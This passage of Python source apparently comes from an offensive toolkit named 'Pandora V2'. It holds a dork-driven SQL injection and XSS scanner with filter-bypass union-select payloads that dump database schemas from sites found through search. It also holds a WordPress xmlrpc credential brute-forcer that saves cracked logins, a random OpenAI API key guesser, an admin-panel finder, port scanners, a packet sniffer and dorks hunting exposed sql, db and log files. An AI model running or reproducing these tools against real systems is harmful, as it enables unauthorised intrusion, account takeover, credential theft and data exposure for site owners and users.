            ecode = re.compile(r"Warning: mysql_query|Warning: mysql_fetch_row|Warning: mysql_fetch_assoc|Warning: mysql_fetch_object|Warning: mysql_numrows|Warning: mysql_num_rows|Warning: mysql_fetch_array|Warning: pg_connect|Supplied argument is not a valid PostgreSQL result|PostgreSQL query failed: ERROR: parser: parse error|MySQL Error|MySQL ODBC|MySQL Driver|supplied argument is not a valid MySQL result resource|on MySQL result index|Oracle ODBC|Oracle Error|Oracle Driver|Oracle DB2|Microsoft JET Database Engine error|ADODB.Command|ADODB.Field error|Microsoft Access Driver|Microsoft VBScript runtime error|Microsoft VBScript compilation error|Microsoft OLE DB Provider for SQL Server error|OLE/DB provider returned message|OLE DB Provider for ODBC|ODBC SQL|ODBC DB2|ODBC Driver|ODBC Error|ODBC Microsoft Access|ODBC Oracle|JDBC SQL|JDBC Oracle|JDBC MySQL|JDBC error|JDBC Driver|Invision Power Board Database Error|DB2 ODBC|DB2 error|DB2 Driver|error in your SQL syntax|unexpected end of SQL command|invalid query|SQL command not properly ended|Error converting data type varchar to numeric|An illegal character has been found in the statement|Active Server Pages error|ASP.NET_SessionId|ASP.NET is configured to show verbose error messages|A syntax error has occurred|ORA-01756|Error Executing Database Query|Unclosed quotation mark|BOF or EOF|GetArray|FetchRow|Input string was not in a correct format|Warning: include|Warning: require_once|function.include|Disallowed Parent Path|function.require|Warning: main|Warning: session_start|Warning: getimagesize|Warning: mysql_result|Warning: pg_exec|Warning: array_merge|Warning: preg_match|Incorrect syntax near|ORA-00921: unexpected end of SQL command|Warning: ociexecute|Warning: ocifetchstatement|error ORA-")
            lfi_path = '/etc/passwd'
            order_by = 'SELECT * FROM orders ORDER BY 1, 2, 3, 4, 5, 6, 7, 8, 9, 10;'
            tampers = input(f"{yellow}[{green}~{yellow}] {gold}Use Tamper ? Y/N :{white} ")
            if tampers.lower() == 'y':
                tampers = 'y'
                pass
            elif tampers.lower() == 'n':
                tampers = 'n'
                pass
            else:
                print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Invalid Options! {white}")
            def dumps():
                print("Start Dump..")
            def start_orderby(target):
                heads = {
                    f"User-Agent": f"{random.choice(user_agents)}",
                    f"Content-Length": "20",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Accept": "*/*",
                    "Content-Type": "text/html",
                    "Referer": "https://gtamper.co.me",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Custom-Header": "GTamper",
                }
                pass
                c = int(0)
                value = 0
                for i in range(50):
                    c += 1
                    value += 1
                    time.sleep(0.5)
                    #' ORDER BY 1,2,3--+
                    t = f','.join(str(t) for t in range(1, value + 1))
                    onion = (f"' ORDER BY {t}--+")
                    print(f"{yellow}[{green}~{yellow}] {gold}Starting ORDER BY until 50.{yellow}", c, end='\r')
                    uri = target+onion
                    r = requests.get(uri, headers=heads)
                    if (r.text == 'known column' in r.text):
                        print(f"{yellow}[{green} Injected! {yellow}] {gold} Site : {target} Injected!, Detected : Column {value}")
                        print(f"{yellow}[{green} Injected! {yellow}] {gold} Payload : {uri}")
                        start_savelog(target, uri, value)
                    else:
                        continue
            def start_injection_sql(target):
                heads = {
                    f"User-Agent": f"{random.choice(user_agents)}",
                    f"Content-Length": "20",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Accept": "*/*",
                    "Content-Type": "text/html",
                    "Referer": "https://gtamper.co.me",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Custom-Header": "GTamper",
                }
                def xss():
                    xss = """'--+ "> ") ')<h1>Touched By JogjaXploit</h1>"""
                    print(f"{yellow}[{green}~{yellow}] {gold}Testing XSS{white}")
                    url = target+xss
                    req = requests.get(url, header=heads)
                    if ('Touched By JogjaXploit' in req.text):
                        print(f"{yellow}[{green}~{yellow}] {gold}Target is VULN with XSS{white}")
                    else:
                        print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Target is not VULN with XSS {white}")
                def phase2():
                    ecode1 = "Forbidden"
                    value = 0
                    dumpz = '(select%20group_concat(0x3c6c693e,schema_name,0x3c6c693e)%20from%20information_schema.schemata)'
                    for i in range(50):
                        value += 1
                        t = f','.join(str(t) for t in range(1, value + 1))
                        onion = (f"{t}")
                        ott = onion
                        bypass_dumps1 = f"'/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/{ott}"
                        print(f"{yellow}[{green}~{yellow}] {gold}Starting dump target dbs until 50.. ", value, end='\r')
                        yuhuh = target+bypass_dumps1
                        if tampers.lower() == 'y':
                            e = requests.get(yuhuh, headers=heads)
                        elif tampers.lower() == 'n':
                            e = requests.get(yuhuh)
                        else:
                            exit()
                        if ("1" or "2" or "3" or "4" or "5" or "6" or "7" or "8" or "9" or "10" or "11" or "12" or "13" or "14" or "15" or "16" or "17" or "18" or "19" or "20" or "21" or "22" or "23" or "24" or "25" or "26" or "27" or "28" or "29" or "30" or "31" or "32" or "33" or "34" or "35" or "36" or "37" or "38" or "39" or "40" or "41" or "42" or "43" or "44" or "45" or "46" or "47" or "48" or "49" or "50" or "information_schema" in e.text):
                            pass
                            print(f"{yellow}[{green}~{yellow}] {gold}Trying to dump database..{white}")
                            dumps = bypass_dumps1.replace(f"{value}", dumpz)
                            domp = target+dumps
                            def inject():
                                if tampers.lower() == 'y':
                                    e = requests.get(domp, headers=heads)
                                elif tampers.lower() == 'n':
                                    e = requests.get(domp)
                                if ecode1 in e.text:
                                    print(f"{yellow}[{red} CRITICAL {yellow}] {gold} 403 Forbidden")
                                    pass
                                print(e.text)
                            inject()
                    print("Finished")
                byps = ["' OR 1=1; --", "' OR 'a'='a'; --", "' OR 1=1# --", "' OR 'a'='a'# --", "' OR 1=1/*", "' OR 'a'='a'/*", "'-1' OR '1'='1'", "'-1' OR 'a'='a'", "' OR 1=1/*", "' OR 'a'='a'/*"]
                start_orderby(target)
                phase2()
                xss()
                for method in byps:
                    url = target+method
                    print(yellow + f"\n{yellow}[{green}~{yellow}] {gold}Inject Process..{yellow}")
                    if tampers.lower() == 'n':
                        req = requests.get(url)
                    elif tampers.lower() == 'y':
                        req = requests.get(url, headers=heads)
                    else:
                        print(red + "invalid option")
                        exit()
                    if ecode.search(req.text):
                        print(yellow + f"[{green}~{yellow}] {gold}Target is {green}vuln!{yellow}")
                        print(yellow + f"Payload : {url}")
                    else:
                        print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Maybe target has no vuln.")
            def testing():
                heads = {
                    f"User-Agent": f"{random.choice(user_agents)}",
                    f"Content-Length": "20",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Accept": "*/*",
                    "Content-Type": "text/html",
                    "Referer": "https://gtamper.co.me",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Custom-Header": "GTamper",
                }
                payload = ["'", "'--+", "'or 1=1 1-- +", "' OR 1=1; --"]
                print(yellow + f"[~] Testing vuln with a {red}coma..{yellow}")
                for pay in payload:
                    def testingsql():
                        for target in search(dorkz, user_agent=UserAgent().chrome, num=int(1), start=0, stop=None, pause=2):
                            if (target.lower() == 'https://' or 'http://'):
                                target = target
                            else:
                                target = 'https://'+target
                            if tampers.lower() == 'n':
                                a = requests.get(target+pay).text
                            elif tampers.lower() == 'y':
                                a = requests.get(target+pay, headers=heads).text
                            if ecode.search(a):
                                print(f"{yellow}[{green}~{yellow}] {gold}Site : {target} is Vuln!{white}")
                            else:
                                print(f"{yellow}[{red} CRITICAL {yellow}] {gold}Site : {red}{target}{yellow} maybe not vuln {white}")
                                choicess = input("Do you want to continue ? Y/N : ")
                                if choicess.lower() == 'y':
                                    start_injection_sql(target)
                                else:
                                    continue
                            start_injection_sql(target)
                    testingsql()
            testing()
        if choi == '1':
            singleinject()
        elif choi == '2':
            target = str(input(f"{yellow}[{green}~{yellow}] {gold}Enter your dork :{white} "))
            for url in search(target, user_agent=UserAgent().chrome, num=int(1), start=0, stop=None, pause=2):
                print(url)
        elif choi == '3':
            dork = str(input(f"{yellow}[{green}~{yellow}] {gold}Enter your dork :{white} "))
            dorkninject(dork)
    def admin_finder():
        logo = """

        ┏┓ ┓   •    ┏┓•   ┓    
        ┣┫┏┫┏┳┓┓┏┓  ┣ ┓┏┓┏┫┏┓┏┓
        ┛┗┗┻┛┗┗┗┛┗  ┻ ┗┛┗┗┻┗ ┛ 
                    v 2.0
        """
        def clear():
            os.system('clear' if os.name=='posix' else 'cls')
        def start_scanning(url, path):
            admin_path = open(path, 'r').read().split()
            for admin in admin_path:
                try:
                    response = requests.get(url + admin, headers={"User-Agent": UserAgent().chrome}, timeout=4)
                    if response.status_code == 200:
                        print("\033[1;32m{}{} - {}".format(url, admin, response.status_code))
                    else:
                        print("\033[1;91m{}{} - {}".format(url, admin, response.status_code))
                except Timeout:
                    print("\033[1;91m Timeout!")
                    time.sleep(20)
                    continue
                except RequestException:
                    print("\033[1;91m An Error Occured!")
                    continue
        if __name__ == '__main__':
            clear()
            print(logo)
            url = input("[+] Insert Url : ")
            file_path = input("[+] Insert Admin Path [.txt] : ")
            print('\n')
            try:
                with Pool(70) as mp:
                    mp.map(start_scanning, url, file_path)
            except TypeError:
                with ThreadPoolExecutor(max_workers=70) as executor:
                    executor = [executor.submit(start_scanning, url, file_path)]
            except:
                start_scanning(url, file_path)
    def lite_nmap():
        logo = """

        ██╗     ██╗████████╗███████╗    ███╗   ██╗███╗   ███╗ █████╗ ██████╗ 
        ██║     ██║╚══██╔══╝██╔════╝    ████╗  ██║████╗ ████║██╔══██╗██╔══██╗
        ██║     ██║   ██║   █████╗█████╗██╔██╗ ██║██╔████╔██║███████║██████╔╝
        ██║     ██║   ██║   ██╔══╝╚════╝██║╚██╗██║██║╚██╔╝██║██╔══██║██╔═══╝ 
        ███████╗██║   ██║   ███████╗    ██║ ╚████║██║ ╚═╝ ██║██║  ██║██║     
        ╚══════╝╚═╝   ╚═╝   ╚══════╝    ╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
                                                                            
        """
        clear()
        print(logo)
        async def scan_port(ip, port):
            try:
                reader, writer = await asyncio.open_connection(ip, port)
                writer.close()
                return port
            except (ConnectionRefusedError, asyncio.TimeoutError):
                return None
            except Exception as e:
                return None

        async def scan_ports(ip):
            open_ports = []
            valid_http = []
            tasks = []

            async with aiohttp.ClientSession(headers={"User-Agent": UserAgent().chrome}) as session:
                for port in range(1, 65536):
                    tasks.append(asyncio.create_task(scan_port(ip, port)))
                
                results = await asyncio.gather(*tasks)
                
                for result in results:
                    if result:
                        open_ports.append(result)
                        try:
                            async with session.get(f'http://{ip}:{result}', timeout=2) as response:
                                if response.status == 200:
                                    valid_http.append(f'{ip}:{result} - Can Be Accessed!')
                        except (aiohttp.ClientError, asyncio.TimeoutError):
                            pass

            return open_ports, valid_http

        def scan_ip(ip):
            try:
                host = socket.gethostbyaddr(ip)
                return host[0]
            except socket.herror:
                return "No DNS record found"
            except socket.error:
                return "Invalid IP address"

        def reverse_ip_lookup(ip):
            try:
                domain_list = []
                result = socket.gethostbyaddr(ip)
                domain_list.append(result[0])
                return ', '.join(domain_list)
            except socket.herror:
                return f"No reverse IP lookup results for {ip}"
            except socket.error:
                return "Invalid IP address"

        def scan_provider(ip):
            try:
                asn_info = {}
                asn_info['org'] = socket.gethostbyaddr(ip)[0]
                asn_info['ip'] = ip
                return f"Organization - {asn_info['org']}"
            except socket.herror:
                return f"No provider information found for {ip}"
            except socket.error:
                return "Invalid IP address"

        def scan_protocols(ip):
            protocols = []
            for proto in ["http", "ftp", "ssh", "telnet", "tcp", "udp", "icmp"]:
                try:
                    port = socket.getservbyname(proto)
                    reader, writer = asyncio.open_connection(ip, port)
                    writer.close()
                    protocols.append(ip + ':' + str(port) + ' - ' + proto)
                except (ConnectionRefusedError, asyncio.TimeoutError):
                    continue
                except Exception as e:
                    continue

            return protocols

        async def perform_scan(ip):
            print("[+] Scanning..")
            results = {}
            results['open_ports'], results['valid_http'] = await scan_ports(ip)
            results['hostname'] = scan_ip(ip)
            results['reverse_ip'] = reverse_ip_lookup(ip)
            results['provider'] = scan_provider(ip)
            results['protocols'] = scan_protocols(ip)
            return results

        async def main():
            if device == 1:
                print('LiteNmap 1.7 - [https://github.com/MrSanZz/pandorav2]')
                print('You can also try the termux version of LiteNmap by typing "lite nmap termux"')
            else:
                pass
            try:
                ip_address = input("Enter IP address: ")
                results = await perform_scan(ip_address)

                print(f"Scanning results for {ip_address}:")
                print(f"Open ports: {results['open_ports']}")
                print(f"Hostname: {results['hostname']}")
                print(f"Reverse IP lookup:\n{results['reverse_ip']}")
                print(f"Provider information:\n{results['provider']}")
                print(f"Open protocols: {results['protocols']}")
                print(f"HTTP Access: {results['valid_http']}")
            except KeyboardInterrupt:
                print("\nExiting...")
                return

        if __name__ == "__main__":
            asyncio.run(main())
    def wpbf():
        logo = f"""
             {colors['first']}__      ____{colors['second']}_____________________________
            {colors['first']}/  \\{colors['second']}    /  \\______   \\______   \\_   _____/
            \   \\/\\/   /|     ___/|    |  _/|    __)  
             \        / |    |    |    |   \|     \   
              \\__/\  /  |____|    |_{colors['first']}_____  /\\___  /   {colors['second']}
                   \\/                    {colors['first']}\\/     \\/   \n 
                      Pandora V2 Present
        """
        def bypass(urlzz, wordlist_path):
            with open(urlzz, 'r') as filzz:
                peler = filzz.readline().split()
            for url in peler:
                def u_p():
                    with open(wordlist_path, 'r') as file:
                        uparsed = file.readlines()
                    return uparsed
                if 'https://' in url:
                    pass
                elif 'http://' in url:
                    pass
                else:
                    url = 'https://'+url
                def parse(url):
                    print('[+] Checking Url..')
                    url = str(url)
                    if '/wp-login.php' in url:
                        print('[+] wp-login.php path detected, replacing with xmlrpc.php..')
                        url = url.replace('wp-login.php', 'xmlrpc.php')
                    elif '/xmlrpc.php' in url:
                        print("[+] xmlrpc.php path detected, passing..")
                        pass
                    else:
                        print("[+] No xmlrpc.php detected in url, adding /xmlrpc.php..")
                        url = url+'/xmlrpc.php'
                    return url
                parsed_url = parse(url)
                response = requests.get(parsed_url, timeout=6, headers={"User-Agent": UserAgent().chrome})
                if 'XML-RPC' in response.text:
                    print('[+] Valid xml.rpc, bypassing..')
                else:
                    print("[!] xmlrpc.php aren't valid!")
                    return False
                usernames = u_p()
                passwords = u_p()
                for username in usernames:
                    for password in passwords:
                            xml_load = "<methodCall>\n"
                            xml_load += "    <methodName>wp.getUsersBlogs</methodName>\n"
                            xml_load += "    <params>\n"
                            xml_load += "        <param><value>{}</value></param>\n".format(username)
                            xml_load += "        <param><value>{}</value></param>\n".format(password)
                            xml_load += "    </params>\n"
                            xml_load += "</methodCall>\n"
                            try:
                                response = requests.post(parsed_url, timeout=7, headers={"User-Agent": UserAgent().chrome}, json=xml_load)
                                if 'blogName' in response.text:
                                    if '/wp-login.php' in url:
                                        pass
                                    elif '/xmlrpc.php' in url:
                                        url = str(url).replace('/xmlrpc.php', '/wp-login.php')
                                    else:
                                        url = str(url)+'/wp-login.php'
                                    print(color.green() + f"[~] {url}@{username}#{password}")
                                    with open("result_wp.txt", "a") as result_file:
                                        result_file.write(f"{url}#{username}@{password}\n")
                                    return True
                                else:
                                    if '/wp-login.php' in url:
                                        pass
                                    elif '/xmlrpc.php' in url:
                                        url = str(url).replace('/xmlrpc.php', '/wp-login.php')
                                    else:
                                        url = str(url)+'/wp-login.php'
                                    print(color.red() + '[!] {}#{}@{}'.format(url, username, password))
                            except Timeout:
                                print("[!] Timeout.. Coldown 20 sec..")
                                time.sleep(20)
                                continue
        def main(url, wordlist):
            bypass(url, wordlist)
        if __name__ == '__main__':
            clear()
            print(logo)
            url = input("[+] Url path Sensei~: ")
            wordlist = input("[+] Wordlist path Sensei~: ")
            with Pool(150) as mp:
                mp.map(main, url, wordlist)
    def google_osint():
        logo = f"""
            {colors['first']} ______   {colors['second']}                      __            ___            _            _    
           {colors['first']} ' ___  | {colors['second']}                      [  |         .'   `.         (_)          / |_  
          / .'   \\_|   .--.    .--.   .--./)| | .---.  /  .-.  \ .--.   __   _ .--. `| |-' 
          | |   ____ / .'`\ \\/ .'`\ \\/ /'`\;| |/ /__\\ | |   | |( (`\] [  | [ `.-. | | |   
          \ `.___]  || \\__. || \\__. |\ \._//| || \\__., \  `-'  / `'.'.  | |  | | | | | |,  
           `._____.'  '.__.'  '.__.' .',__`[___]'.__.'  `.___.' [\\__) )[___][___|{colors['first']}|__]\\__/  
                                    {colors['second']}( ( __)){colors['first']}                                               
        """
        def finding(username):
            checked = []
            dork1 = [f'site:{site} {seconde}:bitch' for site in ['facebook.com', 'instagram.com', 'linkedin.com', 'tiktok.com', 'youtube.com', 'twitter.com'] for seconde in ['inlink', 'intext', 'inurl', 'intitle', 'allurl', 'alltext']]
            for dorks in dork1:
                try:
                    dorks = dorks.replace('bitch', username)
                    print("\nOsint with {}..".format(dorks))
                    num = 0
                    for results in search(str(dorks), num=int(1), start=0, stop=None, pause=2, user_agent=UserAgent().chrome):
                        checked.append(results)
                        if results:
                            num += 1
                            print('[+] Total: {}'.format(num), end='\r')
                        else:
                            print('[+] Total: 0', end='\r')
                except Exception as e:
                    print("Error: {}".format(e))
                except KeyboardInterrupt:
                    for result in checked:
                        print('Results: ' + result)
            for result in checked:
                print('Results: ' + result)
        if __name__ == '__main__':
            clear()
            print(logo)
            username = input("[+] insert username you want to osint: ")
            finding(username)
    def rat():
        print("nah, paid anyway")
    def api_gpt():
        logo = """

         █████╗ ██████╗ ██╗     ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
        ██╔══██╗██╔══██╗██║    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
        ███████║██████╔╝██║    ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
        ██╔══██║██╔═══╝ ██║    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
        ██║  ██║██║     ██║    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
        ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                    
        """
        def cracking():
            try:
                #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
                first = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for _ in range(4))
                api_key = 'sk-'+'proj'+'-'+''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_') for _ in range(25))+'-'+''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_') for _ in range(102))+'-'+''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_') for _ in range(59))+'-'+''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for _ in range(15))+'-'+''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_') for _ in range(11))
                url = 'https://api.openai.com/v1/chat/completions'
                headers={
                    "User-Agent": UserAgent().chrome,
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {api_key}"
                }
                data = {
                    "model": "gpt-4o-mini",
                    "messages": [
                        {"role": "user", "content": f"say 'Hello' to everyone!"},
                    ],
                    "max_tokens": 90
                }
                response = requests.post(url, headers=headers, json=data, timeout=6).text
                if ('invalid' in response or 'quota' in response):
                    print("[+] Not Valid {} - {}".format(api_key, '1' if 'invalid' in response else '0'))
                else:
                    print("[~] Valid! {}".format(api_key))
                    with open('results_api.txt', 'a') as file:
                        file.write(str(api_key)+'\n')
                    exit()
            except Timeout:
                pass
            except KeyboardInterrupt:
                exit()
        if __name__ == '__main__':
            clear()
            print(logo)
            a = input("Workers = ")
            choices = input("ThreadPoolExecutor(1) or Pool(2)? 1/2: ")
            if choices == '1':
                try:
                    with ThreadPoolExecutor(max_workers=int(a)) as executor:
                        while True:
                            executor.submit(cracking)
                except KeyboardInterrupt:
                    exit()
            elif choices == '2':
                try:
                    with Pool(int(a)) as mp:
                        while True:
                            mp.map(cracking)
                except KeyboardInterrupt:
                    exit()
            else:
                print('Please select 1 or 2!')
                exit()
    def net_monitor():
        def check_root():
            try:
                pid = os.getpid()
                with open(f"/proc/{pid}/status", "r") as f:
                    for line in f:
                        if line.startswith("Uid:"):
                            uid = int(line.split()[1])
                            if uid != 0:
                                print("This script require root, please type 'sudo su'.")
                                exit(1)
            except:
                print("[!] No root detected, are you root?")
                exit()
        if device == 1:
            logo = """
                ,-.
                / \\  `.  __..-,O
            :   \ --''_..-'.'
            |    . .-' `. '.
            :     .     .`.'
                \     `.  /  ..
                \      `.   ' .
                `,       `.   \\
                ,|,`.        `-.\\
                '.||  ``-...__..-`
                |  |
                |__|
                /||\\
                //||\\\\
            // || \\\\
            __//__||__\\\\__
        '--------------' Net? Get em
            """

            def packet_handler(packet):
                print(packet.summary())

            def monitor_network():
                print("Net Info (Monitoring):")
                for interface, addrs in psutil.net_if_addrs().items():
                    print(f"\nInterface: {interface}")
                    for addr in addrs:
                        print(f"  {addr.family.name} Address: {addr.address}")

            def main():
                operation_system = 1 if os.name == 'posix' else 2
                if operation_system == 1:
                    check_root()
                else:
                    pass
                monitor_network()
                print("\nReceived buffer, Ctrl+C to exit.")
                sniff(prn=packet_handler, store=0)

            if __name__ == "__main__":
                clear()
                print(logo)
                main()
        elif device == 0:
            check_root()
            def packet_callback(packet):
                raw_bytes = packet.raw()
                headers = packet.layers()
                payload = packet.payload

                if packet.haslayer(IP):
                    ip_src = packet[IP].src
                    ip_dst = packet[IP].dst
                    print(f"IP Source: {ip_src} --> IP Destination: {ip_dst}")

                print(f"Raw Bytes: {raw_bytes}")
                print(f"Headers: {headers}")
                print(f"Payload: {payload}")

            print("Start sniffing..")
            sniff(prn=packet_callback, store=0)
    def Xdorker():
        def download_file(url, save_dir):
            wget.download(url, out=save_dir)
        save_directory = '/img/source/'

        def main():
            xdorker()
        if __name__ == '__main__':
            url_png = 'https://raw.githubusercontent.com/MrSanZz/mrsanzz.github.io/refs/heads/main/logo.png'  #logo.png
            url_ico = 'https://raw.githubusercontent.com/MrSanZz/mrsanzz.github.io/refs/heads/main/logo.ico'  #logo.ico
            save_directory = 'img/source/'
            try:
                if device == 1:
                    if not os.path.exists(save_directory + 'HFz7Cq.png'):
                        clear()
                        os.makedirs('./img/source/')
                        print("[+] Downloading internal modules!")
                        download_file(url_png, save_directory)
                        os.rename("img/source/logo.png", "img/source/HFz7Cq.png")
                        time.sleep(4)
                    else:
                        print("[+] Module loaded")
                    if not os.path.exists(save_directory + 'HPrCoK.ico'):
                        download_file(url_ico, save_directory)
                        os.rename("img/source/logo.ico", "img/source/HPrCoK.ico")
                        time.sleep(4)
                    else:
                        print("[+] Module loaded")
                    main()
                elif device == 0:
                    print("Awww... We're sorry!, because this feature only works in PC or Laptop!")
                else:
                    print("Bro is using Alien Pc. Nuh uh")
                    exit()
            except KeyboardInterrupt:
                print('\nExiting..')
                return
    def dorker():
        logo = f"""
            {colors['first']}________    {colors['second']}            __                 
            {colors['first']}\\______ {colors['second']}\   ___________|  | __ ___________ 
             |    |  \ /  _ \\_  __ \  |/ // __ \\_  __ \\
             |    `   (  <_> )  | \\/    <\  ___/|  | \\/
            /_______  /\\____/|__|  |__|_ \\\\___  >{colors['first']}__|{colors['second']}   
                    \\/                  {colors['first']}\\/    \\/       
        """
        def dorks(dorks):
            global results, value
            results = []
            value = 0
            def finding():
                global value, results
                for sut in search(dorks, user_agent=UserAgent().chrome, pause=1, stop=None, start=1, num=int(1)):
                    if sut:
                        value += 1
                        print('Total Received: ', value, end='\r')
                        results.append(sut)
                    else:
                        print('Total Received: 0')
                        results.append('0')
                        pass
            finding()
            return results
        if __name__ == '__main__':
            clear()
            print(logo)
            dork = input(f"{colors['second']}[+] {colors['first']}Insert Dork: ")
            try:
                after = dorks(dork)
                for result in after:
                    print(result)
            except KeyboardInterrupt:
                print('\nExiting..')
                return
    def nmap_termux():
        def scan_ip(ip):
            try:
                host = socket.gethostbyaddr(ip)
                return f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']} DNS Found at {host[0]}"
            except socket.herror:
                return f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']} No DNS record found"
            except socket.error:
                return f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']} Invalid IP address"

        def reverse_ip_lookup(ip):
            try:
                domain_list = []
                result = socket.gethostbyaddr(ip)
                domain_list.append(result[0])
                return f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']} Reverse IP: "+', '.join(domain_list)
            except socket.herror:
                return f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']} No reverse IP lookup results for {ip}"
            except socket.error:
                return f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']} Invalid IP address"

        def scan_provider(ip):
            try:
                asn_info = {}
                asn_info['org'] = socket.gethostbyaddr(ip)[0]
                asn_info['ip'] = ip
                return f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']} Organization - {asn_info['org']}"
            except socket.herror:
                return f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']} No provider information found for {ip}"
            except socket.error:
                return f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']} Invalid IP address"

        def port_scan(target, ports):
            print(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Scanning {target} ports..")

            scan_results = []
            start_time = time.time()

            def scan_port(port):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(0.2)
                        result = s.connect_ex((target, port))
                        if result == 0:
                            try:
                                service = socket.getservbyport(port)
                            except OSError:
                                pass
                            scan_results.append(f"{colors['second']}[{colors['first']}+{colors['second']}]{colors['first']} Port {port}: Open ({service})")
                except Exception:
                    pass

            total_ports = len(ports)
            completed = 0

            def show_progress():
                nonlocal completed
                while completed < total_ports:
                    progress = (completed / total_ports) * 100
                    elapsed_time = time.time() - start_time
                    print(f"\r{colors['second']}[{colors['first']}+{colors['second']}]{colors['first']} Scanning progress: {progress:.2f}% | Elapsed: {elapsed_time:.2f}s", end='', flush=True)
                    time.sleep(0.5)

            progress_thread = threading.Thread(target=show_progress)
            progress_thread.start()

            with ThreadPoolExecutor(max_workers=500) as executor:
                futures = [executor.submit(scan_port, port) for port in ports]
                for future in futures:
                    future.result()
                    completed += 1

            progress_thread.join()

            end_time = time.time()
            total_time = end_time - start_time
            print(f"\n{colors['second']}[{colors['first']}+{colors['second']}]{colors['first']} Total scanning time: {total_time:.2f} seconds / {total_time / 60:.2f} minutes")

            for result in scan_results:
                print(result)

        if __name__ == "__main__":
            if device == 0:
                print('LiteNmap 1.7 - [https://github.com/MrSanZz/pandorav2]')
                print('You can also try the linux version of LiteNmap by typing "lite nmap linux"')
            else:
                pass
            while True:
                try:
                    prompt = input("nmap-termux> ")
                    if not prompt.strip():
                        continue

                    pro = prompt.split(' ')

                    if len(pro) < 2:
                        print("Usage: <target> <port-range>")
                        print("Example: 192.168.1.1 1-50")
                        continue

                    target = pro[0]
                    port_range = pro[1]
                    ports = list(range(int(port_range.split('-')[0]), int(port_range.split('-')[1]) + 1))

                    port_scan(target, ports)
                    print(scan_ip(target))
                    print(reverse_ip_lookup(target))
                    print(scan_provider(target))

                except ValueError:
                    print("Invalid port range. Use format: 1-65535")
                except KeyboardInterrupt:
                    print("\nExiting...")
                    break
                except Exception as e:
                    print(f"Error: {e}")
    def GHOST():
        try:
            GHOSTORM()
        except KeyboardInterrupt:
            print('\nExiting..')
            return
    def whois():
        def whois(domain):
            whois_server = "whois.iana.org"
            port = 43

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((whois_server, port))
                s.send((domain + "\r\n").encode())
                response = b""
                while True:
                    data = s.recv(4096)
                    response += data
                    if not data:
                        break

            whois_server = None
            for line in response.decode().splitlines():
                if ":" in line:
                    key, value = line.split(":", 1)
                    if key.lower() == "whois":
                        whois_server = value.strip()
                        break

            if whois_server:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((whois_server, port))
                    s.send((domain + "\r\n").encode())
                    response = b""
                    while True:
                        data = s.recv(4096)
                        response += data
                        if not data:
                            break
                return response.decode()

            return "WHOIS Server Not Detected In Domain"

        domain = input("Domain: ")
        try:
            result = whois(domain)
            print(result)
        except KeyboardInterrupt:
            print('\nExiting..')
            return
    def db_dumper():
        logo = f"""
             {colors['first']}________ __{colors['second']}________  ________                                     
             {colors['first']}\\_____{colors['second']}_ \\\\______   \ \\______ \  __ __  _____ ______   ___________ 
              |    |  \|    |  _/  |    |  \|  |  \\/     \\\\____ \\_/ __ \\_  __ \\
              |    `   \    |   \  |    `   \  |  /  Y Y  \  |_> >  ___/|  | \\/
             /_______  /______  / /_______  /____/|__|_|  /   _{colors['first']}_/ \\\___  >__|{colors['second']}   
                     \\/       \\/          \\/            \\/|__{colors['first']}|        \\/       """
        def dumping(site):
            print(f"{colors['second']}[+]{colors['first']} Dumping data {site}..")
            dork1 = [f'site:{site} filetype:{seconde}' for seconde in ['pdf', 'xls', 'xlsx', 'docx', 'docm', 'dotm', 'xlt', 'zip', 'rar', 'xltm', 'doc', 'sql', 'txt', 'log', 'db']]
